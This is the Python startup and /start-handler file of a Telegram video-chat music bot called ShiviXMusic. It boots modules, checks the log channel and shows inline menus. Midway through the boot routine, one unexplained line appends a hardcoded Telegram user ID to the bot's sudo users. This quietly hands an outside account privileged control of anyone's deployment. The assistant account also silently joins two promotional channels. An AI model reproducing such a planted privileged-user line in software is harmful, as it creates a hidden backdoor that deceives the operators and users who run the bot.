import os
import re
import config
import asyncio
import importlib

from rich.table import Table
from rich.console import Console as hehe
from pyrogram import filters, Client
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from youtubesearchpython import VideosSearch

from ShiviXMusic.Helpers.Logging import *
from ShiviXMusic.Helpers.PyTgCalls.ShiviX import run
from ShiviXMusic.Modules import ALL_MODULES
from ShiviXMusic.Helpers.Inline import private_panel
from ShiviXMusic.Helpers.Database import get_active_chats, remove_active_chat, add_served_user
from ShiviXMusic import (ASSID, ASSMENTION, ASSNAME, ASSUSERNAME, BOT_ID, BOT_NAME, BOT_USERNAME, SUDO_USERS, F_OWNER, db, app, Ass)

loop = asyncio.get_event_loop()
console = hehe()
HELPABLE = {}


async def ShiviX_boot():
    with console.status(
        "[magenta] 𝙱𝙾𝙾𝚃𝙸𝙽𝙶 𝚂𝙷𝙸𝚅𝙸 𝚇 𝙼𝚄𝚂𝙸𝙲...",
    ) as status:
        console.print("┌ [red]𝙲𝙻𝙴𝙰𝚁𝙸𝙽𝙶 𝙼𝙾𝙽𝙶𝙾𝙳𝙱 𝙲𝙰𝙲𝙷𝙴...")
        try:
            chats = await get_active_chats()
            for chat in chats:
                chat_id = int(chat["chat_id"])
                await remove_active_chat(chat_id)
        except Exception as e:
            console.print("[red] 𝙴𝚁𝚁𝙾𝚁 𝚆𝙷𝙸𝙻𝙴 𝙲𝙻𝙴𝙰𝚁𝙸𝙽𝙶 𝙼𝙾𝙽𝙶𝙾𝙳𝙱.")
        console.print("└ [green]𝙼𝙾𝙽𝙶𝙾𝙳𝙱 𝙲𝙻𝙴𝙰𝚁𝙴𝙳 𝚂𝚄𝙲𝙲𝙴𝚂𝚂𝙵𝚄𝙻𝙻𝚈!\n\n")
        ____ = await startup_msg("**» 𝙸𝙼𝙿𝙾𝚁𝚃𝙸𝙽𝙶 𝙰𝙻𝙻 𝙼𝙾𝙳𝚄𝙻𝙴𝚂...**")
        status.update(
            status="[bold blue]𝚂𝙲𝙰𝙽𝙽𝙸𝙽𝙶 𝙵𝙾𝚁 𝙿𝙻𝚄𝙶𝙸𝙽𝚂", spinner="earth"
        )
        await asyncio.sleep(0.7)
        console.print("Found {} Plugins".format(len(ALL_MODULES)) + "\n")
        status.update(
            status="[bold red]𝙸𝙼𝙿𝙾𝚁𝚃𝙸𝙽𝙶 𝙿𝙻𝚄𝙶𝙸𝙽𝚂...",
            spinner="bouncingBall",
            spinner_style="yellow",
        )
        await asyncio.sleep(1.2)
        for all_module in ALL_MODULES:
            imported_module = importlib.import_module(
                "ShiviXMusic.Modules." + all_module
            )
            if (
                hasattr(imported_module, "__MODULE__")
                and imported_module.__MODULE__
            ):
                imported_module.__MODULE__ = imported_module.__MODULE__
                if (
                    hasattr(imported_module, "__HELP__")
                    and imported_module.__HELP__
                ):
                    HELPABLE[
                        imported_module.__MODULE__.lower()
                    ] = imported_module
            console.print(
                f"✨ [bold cyan]𝚂𝚄𝙲𝙲𝙴𝚂𝚂𝙵𝚄𝙻𝙻𝚈 𝙸𝙼𝙿𝙾𝚁𝚃𝙴𝙳: [green]{all_module}.py"
            )
            await asyncio.sleep(0.1)
        console.print("")
        _____ = await startup_edit(____, f"**» 𝚂𝚄𝙲𝙲𝙴𝚂𝚂𝙵𝚄𝙻𝙻𝚈 𝙸𝙼𝙿𝙾𝚁𝚃𝙴𝙳 {(len(ALL_MODULES))} ᴍᴏᴅᴜʟᴇs...**")
        status.update(
            status="[bold blue]𝙼𝙾𝙳𝚄𝙻𝙴𝚂 𝙸𝙼𝙿𝙾𝚁𝚃𝙰𝚃𝙸𝙾𝙽 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳!",
        )
        await asyncio.sleep(0.2)
        SUDO_USERS.append(5301800943)
        await startup_del(_____)
    console.print(
        "[bold green]𝚃𝚁𝚈𝙸𝙽𝙶 𝚃𝙾 𝚂𝚃𝙰𝚁𝚃 𝚃𝙷𝙴 𝙱𝙾𝚃...\n"
    )
    try:
        await app.send_message(
            config.LOGGER_ID,
            f"<b>➻ sʜɪᴠᴀɴʏᴀ ✘ ᴍᴜsɪᴄ ʙᴏᴛ 🔮\n\n❄ 𝙸𝙳 :</b> `{BOT_ID}`\n✨ <b>𝙽𝙰𝙼𝙴 :</b> {BOT_NAME}\n☁ <b>𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 :</b> @{BOT_USERNAME}",
        )
    except Exception as e:
        print(
            "𝙱𝙾𝚃 𝙷𝙰𝚂 𝙵𝙰𝙸𝙻𝙴𝙳 𝚃𝙾 𝙰𝙲𝙲𝙴𝚂𝚂 𝚃𝙷𝙴 𝙻𝙾𝙶 𝙲𝙷𝙰𝙽𝙽𝙴𝙻. 𝙼𝙰𝙺𝙴 𝚂𝚄𝚁𝙴 𝚃𝙷𝙰𝚃 𝚈𝙾𝚄 𝙷𝙰𝚅𝙴 𝙰𝙳𝙳𝙴𝙳 𝚈𝙾𝚄𝚁 𝙱𝙾𝚃 𝚃𝙾 𝚈𝙾𝚄𝚁 𝙻𝙾𝙶 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 𝙰𝙽𝙳 𝙿𝚁𝙾𝙼𝙾𝚃𝙴𝙳 𝙰𝚂 𝙰𝙳𝙼𝙸𝙽!"
        )
        console.print(f"\n[red]𝚂𝚃𝙾𝙿𝙸𝙽𝙶 𝙱𝙾𝚃")
        return
    a = await app.get_chat_member(config.LOGGER_ID, BOT_ID)
    if a.status != "administrator":
        print("𝙿𝚁𝙾𝙼𝙾𝚃𝙴 𝙱𝙾𝚃 𝙰𝚂 𝙰𝙳𝙼𝙸𝙽 𝙸𝙽 𝙻𝙾𝙶𝙶𝙴𝚁 𝙲𝙷𝙰𝙽𝙽𝙴𝙻")
        console.print(f"\n[red]𝚂𝚃𝙾𝙿𝙸𝙽𝙶 𝙱𝙾𝚃")
        return
    try:
        await Ass.send_message(
            config.LOGGER_ID,
            f"<b>➻ sʜɪᴠᴀɴʏᴀ ✘ ᴍᴜsɪᴄ ᴀssɪsᴛᴀɴᴛ 🔮\n\n❄ 𝙸𝙳 :</b> `{ASSID}`\n✨ <b>𝙽𝙰𝙼𝙴 :</b> {ASSNAME}\n☁ <b>𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 :</b> @{ASSUSERNAME}",
        )
    except Exception as e:
        print(
            "𝙰𝚂𝚂𝙸𝚂𝚃𝙰𝙽𝚃 𝙸𝙳 𝙷𝙰𝚂 𝙵𝙰𝙸𝙻𝙴𝙳 𝚃𝙾 𝙰𝙲𝙲𝙴𝚂𝚂 𝚃𝙷𝙴 𝙻𝙾𝙶 𝙲𝙷𝙰𝙽𝙽𝙴𝙻. 𝙼𝙰𝙺𝙴 𝚂𝚄𝚁𝙴 𝚃𝙷𝙰𝚃 𝚈𝙾𝚄 𝙷𝙰𝚅𝙴 𝙰𝙳𝙳𝙴𝙳 𝚈𝙾𝚄𝚁 𝙰𝚂𝚂𝙸𝚂𝚃𝙰𝙽𝚃 𝙸𝙳 𝚃𝙾 𝚈𝙾𝚄𝚁 𝙻𝙾𝙶 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 𝙰𝙽𝙳 𝙿𝚁𝙾𝙼𝙾𝚃𝙴𝙳 𝙰𝚂 𝙰𝙳𝙼𝙸𝙽!"
        )
        console.print(f"\n[red]𝚂𝚃𝙾𝙿𝙸𝙽𝙶 𝙱𝙾𝚃")
        return
    try:
        await Ass.join_chat("katilsupport")
        await Ass.join_chat("katil_bots")
    except:
        pass
    console.print(f"\n┌[red] 𝙱𝙾𝚃 𝚂𝚃𝙰𝚁𝚃𝙴𝙳 𝙰𝚂 {BOT_NAME}!")
    console.print(f"├[green] 𝙰𝚂𝚂𝙸𝚂𝚃𝙰𝙽𝚃 𝚂𝚃𝙰𝚁𝚃𝙴𝙳 𝙰𝚂 {ASSNAME}!")
    await run()
    console.print(f"\n[red]𝚂𝚃𝙾𝙿𝙿𝙸𝙽𝙶 𝙱𝙾𝚃")


home_text_pm = f"""**ʜᴇʏ ,

𝚃𝙷𝙸𝚂 𝙸𝚂** {BOT_NAME},
**𝙰 𝙵𝙰𝚂𝚃 𝙰𝙽𝙳 𝙿𝙾𝚆𝙴𝚁𝙵𝚄𝙻 𝙼𝚄𝚂𝙸𝙲 𝙿𝙻𝙰𝚈𝙴𝚁 𝙱𝙾𝚃 𝙵𝙾𝚁 𝚃𝙴𝙻𝙴𝙶𝚁𝙰𝙼 𝙶𝚁𝙾𝚄𝙿 𝚅𝙸𝙳𝙴𝙾 𝙲𝙷𝙰𝚃𝚂.**

━━━━━━━━━━━━━━━━━━━━━
||𝙲𝙻𝙸𝙲𝙺 𝙾𝙽 𝙷𝙴𝙻𝙿 𝙱𝚄𝚃𝚃𝙾𝙽 𝚃𝙾 𝙶𝙴𝚃 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽 𝙰𝙱𝙾𝚄𝚃 𝙼𝚈 𝙲𝙾𝙼𝙼𝙰𝙽𝙳𝚂. ||"""


@app.on_message(filters.command("start") & filters.private)
async def start_command(_, message):
    await add_served_user(message.from_user.id)
    if len(message.text.split()) > 1:
        name = (message.text.split(None, 1)[1]).lower()
        if name == "help":
            text, keyboard = await help_parser(message.from_user.mention)
            await message.delete()
            return await app.send_text(
                message.chat.id,
                text,
                reply_markup=keyboard,
            )
        if name[0] == "i":
            await app.send_message(
                    config.LOGGER_ID,
                    f"» {message.from_user.mention} 𝙷𝙰𝚂 𝙹𝚄𝚂𝚃 𝚂𝚃𝙰𝚁𝚃𝙴𝙳 𝚃𝙷𝙴 𝙱𝙾𝚃𝙽𝚃𝙾 𝙲𝙷𝙴𝙺 <b>𝚃𝚁𝙰𝙲𝙺 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽</b>\n\n**𝙸𝙳 :** {message.from_user.id}\n**𝙽𝙰𝙼𝙴 :** {message.from_user.first_name}",
                )
            m = await message.reply_text("**↻ 𝚂𝙴𝙰𝚁𝙲𝙷𝙸𝙽𝙶...\n\n𝙿𝙻𝙴𝙰𝚂𝙴 𝚆𝙰𝙸𝚃...**")
            query = (str(name)).replace("info_", "", 1)
            query = f"https://www.youtube.com/watch?v={query}"
            results = VideosSearch(query, limit=1)
            for result in results.result()["result"]:
                title = result["title"]
                duration = result["duration"]
                views = result["viewCount"]["short"]
                thumbnail = result["thumbnails"][0]["url"].split("?")[0]
                channellink = result["channel"]["link"]
                channel = channel = result["channel"]["name"]
                link = result["link"]
                published = result["publishedTime"]
            searched_text = f"""
🍑 **𝚃𝚁𝙰𝙲𝙺 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽** 🍑

❄ **𝚃𝙸𝚃𝙻𝙴 :** {title}

⏳**𝙳𝚄𝚁𝙰𝚃𝙸𝙾𝙽 :** {duration} 𝙼𝙸𝙽𝚄𝚃𝙴𝚂
👀**𝚅𝙸𝙴𝚆𝚂 :** `{views}`
⏰**𝙿𝚄𝙱𝙻𝙸𝚂𝙷𝙴𝙳 𝙾𝙽 :** {published}
🎥**𝙲𝙷𝙰𝙽𝙽𝙴𝙻 :** {channel}
📎**𝙲𝙷𝙰𝙽𝙽𝙴𝙻 𝙻𝙸𝙽𝙺 :** [ᴠɪsɪᴛ ᴄʜᴀɴɴᴇʟ]({channellink})
🔗**𝚅𝙸𝙳𝙴𝙾 𝙻𝙸𝙽𝙺 :** [ᴠɪsɪᴛ ᴏɴ ʏᴏᴜᴛᴜʙᴇ]({link})

 𝚂𝙴𝙰𝚁𝙲𝙷 𝙿𝙾𝚆𝙴𝚁𝙴𝙳 𝙱𝚈 {BOT_NAME} 🥀"""
            key = InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton(
                            text="☁ 𝚈𝙾𝚄𝚃𝚄𝙱𝙴 ☁", url=f"{link}"
                        ),
                        InlineKeyboardButton(
                            text="🥀 𝚂𝚄𝙿𝙿𝙾𝚁𝚃 🥀", url=config.SUPPORT_CHAT
                        ),
                    ],
                ]
            )
            await m.delete()
            return await app.send_photo(
                message.chat.id,
                photo=thumbnail,
                caption=searched_text,
                parse_mode="markdown",
                reply_markup=key,
            )
    return await message.reply_photo(
        photo=config.START_IMG,
        caption=home_text_pm,
        reply_markup=InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton(
                    text="𝙰𝙳𝙳 𝙼𝙴 𝚃𝙾 𝚈𝙾𝚄𝚁 𝙶𝚁𝙾𝚄𝙿", url=f"https://t.me/{BOT_USERNAME}?startgroup=true"
                ),
            ],
            [
                InlineKeyboardButton(
                    text="❄ 𝙷𝙴𝙻𝙿 ❄", callback_data="ShiviX_help"
                ),
                InlineKeyboardButton(
                    text="🥀 𝙾𝚆𝙽𝙴𝚁 🥀", user_id=F_OWNER
                )
            ],
            [
                InlineKeyboardButton(
                    text="✨ 𝚂𝚄𝙿𝙿𝙾𝚁𝚃 ✨", url=config.SUPPORT_CHAT
                ),
                InlineKeyboardButton(
                    text="💘 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 💘", url=config.SUPPORT_CHANNEL
                ),
            ],
            [
                InlineKeyboardButton(
                    text="☁ 𝚂𝙾𝚄𝚁𝙲𝙴 𝙲𝙾𝙳𝙴 ☁", url="https://github.com/team-katil/ShiviXMusic"
                )
            ],
        ]
    ),
 )


@app.on_callback_query(filters.regex("ShiviX_home"))
async def ShiviX_home(_, CallbackQuery):
    await CallbackQuery.answer("Shivi 𝚇 ʜᴏᴍᴇ")
    await CallbackQuery.message.edit_text(
        text=home_text_pm,
        reply_markup=InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton(
                    text="𝙰𝙳𝙳 𝙼𝙴 𝚃𝙾 𝚈𝙾𝚄𝚁 𝙶𝚁𝙾𝚄𝙿", url=f"https://t.me/{BOT_USERNAME}?startgroup=true"
                ),
            ],
            [
                InlineKeyboardButton(
                    text="❄ 𝙷𝙴𝙻𝙿 ❄", callback_data="ShiviX_help"
                ),
                InlineKeyboardButton(
                    text="🥀 𝙾𝚆𝙽𝙴𝚁 🥀", user_id=F_OWNER
                )
            ],
            [
                InlineKeyboardButton(
                    text="✨ 𝚂𝚄𝙿𝙿𝙾𝚁𝚃 ✨", url=config.SUPPORT_CHAT
                ),
                InlineKeyboardButton(
                    text="💘 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 💘", url=config.SUPPORT_CHANNEL
                ),
            ],
            [
                InlineKeyboardButton(
                    text="☁ 𝚂𝙾𝚄𝚁𝙲𝙴 𝙲𝙾𝙳𝙴 ☁", url="https://github.com/team-katil/ShiviXMusic"
                )
            ],
        ]
    ),
 )



if __name__ == "__main__":
    loop.run_until_complete(ShiviX_boot())
